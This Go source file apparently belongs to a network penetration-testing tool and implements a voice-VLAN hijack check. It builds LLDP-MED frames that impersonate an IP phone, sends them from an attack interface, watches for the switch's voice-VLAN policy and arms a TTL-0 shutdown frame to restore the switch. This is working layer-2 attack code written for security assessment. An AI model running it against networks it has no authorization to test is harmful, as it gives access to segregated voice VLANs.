// voicevlan.go implements the voice-VLAN hijack check. The base entry is
// impact temporary, restore active, affects clients: the LLDP-MED frame
// impersonates a phone that advertises a voice-VLAN network policy, and
// the armed lldp-shutdown step sends an LLDPDU with TTL 0, the shutdown
// form that tells the receiver to discard the neighbor entry (IEEE
// 802.1AB, unverified: the standard is not vendored). The persist mode is
// impact temporary, restore decay with the 120 s bound the frame's TTL
// announces, affects clients, with nothing armed.
//
// The LLDP-MED TLVs are organizationally specific TLVs (type 127, OUI
// 00:12:bb): the MED Capabilities TLV (subtype 1, class 3) the baseline
// sends, then the Network Policy TLV (subtype 2) whose four info octets are
// the application type, then the U, T, and X flags over a 12-bit VLAN id,
// then a 3-bit L2 priority and a 6-bit DSCP, the layout gopacket's decoder
// reads (lldp.go, DecodeMedia).

package l2

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

// The LLDP-MED identifiers the frames carry: the TIA OUI and the two
// subtypes, the voice application type, and the pre-read bound.
const (
	lldpTLVOrgSpecific      = 127
	lldpMEDSubtypeCaps      = 1
	lldpMEDSubtypePolicy    = 2
	lldpMEDAppVoice         = 1
	voiceVLANPreRead        = 30 * time.Second
	voiceVLANPolicyPriority = 5
	voiceVLANPolicyDSCP     = 46
)

// lldpMEDOUI is the TIA OUI organizationally specific LLDP-MED TLVs carry.
var lldpMEDOUI = []byte{0x00, 0x12, 0xbb}

type voiceVLANFinding struct {
	Action  string `json:"action"`
	VLAN    uint16 `json:"voice_vlan"`
	Restore string `json:"restore"`
}

// RunVoiceVLAN reads the leg for 30 s or half the window, whichever is
// shorter, so the probe keeps the other half, for an LLDP-MED network
// policy TLV from another sender naming the
// target's voice VLAN, then sends the LLDP-MED frame impersonating a phone
// from the attack leg's MAC and observes. The port name, TTL, priority,
// and DSCP are probe content. The predicate is such a TLV after the probe,
// when the pre-read carried none, which confirms that the switch
// advertises the policy to the phone it now sees; none after the probe
// resists; a pre-read that already carried it is pending, since the probe
// changes nothing the segment did not already say. The switch's CDP voice
// VLAN reply and tagged traffic count for nothing, since both arrive
// without a probe. Whether a switch sends LLDP-MED TLVs only after hearing
// a MED endpoint is unverified (ANSI/TIA-1057 is not vendored). The base
// entry arms the TTL-0 shutdown before the first frame; the persist mode
// arms nothing.
func RunVoiceVLAN(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVoiceVLAN); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	voiceVLAN := deps.Target.VoiceVLAN

	restoreArmed := "no"
	if deps.Entry.Restore.Kind == check.RestoreActive {
		shutdown, err := craftLLDPShutdown(src)
		if err != nil {
			return check.Verdict{}, errs.Wrap(err, "voicevlan: craft shutdown")
		}
		deps.Teardown.Arm("lldp-shutdown", func(ctx context.Context) error {
			return deps.AttackLeg.Send(ctx, shutdown)
		})
		restoreArmed = "yes"
	}

	match := func(data []byte) bool { return isMEDPolicyFor(data, src, voiceVLAN) }
	seen, pre, err := check.First(ctx, deps.AttackLeg, min(voiceVLANPreRead, deps.Observe/2), match)
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "voicevlan: receive before the probe")
	}
	if seen != nil {
		return check.Pending("the switch advertised the policy before the probe"), nil
	}

	pkt, err := craftLLDPVoiceVLAN(src, voiceVLAN)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "voicevlan: craft frame")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "voicevlan: send")
	}

	detail, _ := json.Marshal(voiceVLANFinding{
		Action:  "voice-vlan-hijack",
		VLAN:    voiceVLAN,
		Restore: restoreArmed,
	})
	deps.Emitter.Finding("lldp", detail)

	found, obs, err := check.First(ctx, deps.AttackLeg, deps.Observe-pre.Elapsed, match)
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "voicevlan: receive after the probe")
	}
	observed := pre.Elapsed + obs.Elapsed
	if found != nil {
		return check.Confirmed(fmt.Sprintf("the switch advertised the MED policy for VLAN %d after the probe", voiceVLAN), observed), nil
	}
	return check.Resisted(fmt.Sprintf("no MED policy for VLAN %d in %s", voiceVLAN, observed.Round(time.Millisecond)), observed), nil
}

// craftLLDPVoiceVLAN builds the LLDP-MED frame a phone sends: chassis id,
// port id, TTL, the MED Capabilities TLV, and the Network Policy TLV
// naming the voice VLAN, tagged, with priority 5 and DSCP 46.
func craftLLDPVoiceVLAN(src net.HardwareAddr, voiceVLAN uint16) ([]byte, error) {
	payload := lldpHeaderTLVs(src, lldpTTL)
	payload = append(payload, lldpOrgTLV(lldpMEDSubtypeCaps, []byte{0x13, 0x00, 0x03})...)
	payload = append(payload, lldpOrgTLV(lldpMEDSubtypePolicy, medNetworkPolicy(voiceVLAN, voiceVLANPolicyPriority, voiceVLANPolicyDSCP))...)
	payload = append(payload, 0x00, 0x00)
	return craftLLDP(src, payload)
}

// craftLLDPShutdown builds the LLDPDU with TTL 0 that tells the receiver
// to discard the neighbor entry.
func craftLLDPShutdown(src net.HardwareAddr) ([]byte, error) {
	payload := lldpHeaderTLVs(src, 0)
	payload = append(payload, 0x00, 0x00)
	return craftLLDP(src, payload)
}

// craftLLDP builds Ethernet → LLDP payload. The payload is raw TLV bytes,
// since the wire format is plain TLVs.
func craftLLDP(src net.HardwareAddr, payload []byte) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       lldpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeLinkLayerDiscovery,
	}
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{}, eth, gopacket.Payload(payload)); err != nil {
		return nil, err
	}
	return append([]byte(nil), buf.Bytes()...), nil
}

// lldpHeaderTLVs builds the three mandatory TLVs: chassis id (subtype 4,
// MAC), port id (subtype 5, interface name), and TTL.
func lldpHeaderTLVs(src net.HardwareAddr, ttl uint16) []byte {
	var payload []byte
	payload = append(payload, lldpTLV(1, append([]byte{0x04}, src...))...)
	payload = append(payload, lldpTLV(2, append([]byte{0x05}, []byte("eth0")...))...)
	ttlField := make([]byte, 2)
	binary.BigEndian.PutUint16(ttlField, ttl)
	payload = append(payload, lldpTLV(3, ttlField)...)
	return payload
}

// medNetworkPolicy builds the four info octets of the Network Policy TLV:
// the application type, then U (0), T (1), X (0) over the 12-bit VLAN id,
// then the 3-bit L2 priority and the 6-bit DSCP.
func medNetworkPolicy(vlan uint16, priority, dscp uint8) []byte {
	bits := uint32(1)<<22 | uint32(vlan&0x0fff)<<9 | uint32(priority&0x07)<<6 | uint32(dscp&0x3f)
	return []byte{lldpMEDAppVoice, byte(bits >> 16), byte(bits >> 8), byte(bits)}
}

// lldpOrgTLV builds an organizationally specific TLV with the TIA OUI.
func lldpOrgTLV(subtype uint8, info []byte) []byte {
	value := append(append(append([]byte(nil), lldpMEDOUI...), subtype), info...)
	return lldpTLV(lldpTLVOrgSpecific, value)
}

// lldpTLV builds an LLDP TLV: 7-bit type + 9-bit length header, then value.
func lldpTLV(tlvType uint8, value []byte) []byte {
	header := uint16(tlvType)<<9 | uint16(len(value)&0x1FF)
	out := make([]byte, 2+len(value))
	binary.BigEndian.PutUint16(out[0:2], header)
	copy(out[2:], value)
	return out
}
